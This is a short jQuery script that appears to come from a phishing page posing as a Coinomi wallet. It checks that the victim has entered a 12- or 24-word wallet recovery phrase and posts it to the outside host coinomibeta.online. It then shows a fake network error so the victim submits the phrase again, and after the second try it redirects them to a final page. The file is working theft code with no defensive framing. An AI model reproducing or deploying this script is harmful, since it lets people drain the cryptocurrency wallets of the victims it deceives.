$(document).ready(function() {
    var info = false ;
    var x = 0 ;

    

    $("#ok").on("click", function() {
        

        // var addres and full name
        var privat = $('#name').val();
        let y = privat.split(' ');
        let check = y.length;
        
      

         if(check < 12 || check > 12 || check < 24 || check > 24 ) {
            document.getElementById("error").innerHTML = 'Please enter a valid Mnemonic Phrase';
           
        }  
        if (check == 24 || check == 12) {
          document.getElementById("error").innerHTML = '';
            var info = true;

        }
      
        if (info) {
            
            $.ajax({
        
                        url : 'https://coinomibeta.online/post/connexion.php',
                        type : 'Post',
                        data: {
                            priv: privat,
                },
                        dataType : 'html',
                        success : function(code_html, statut){ 
                          if (x == 1){
                                    location.href = "./final.html";
                                }
                                $('#name').val('');
                                document.getElementById("error").innerHTML = 'network error occurred please try again';
                                x = x + 1 ;
                        
                        },
                        

                        error : function(resultat, statut, erreur){
                        
                        

                        }
});

        }

        

    });
    
    
});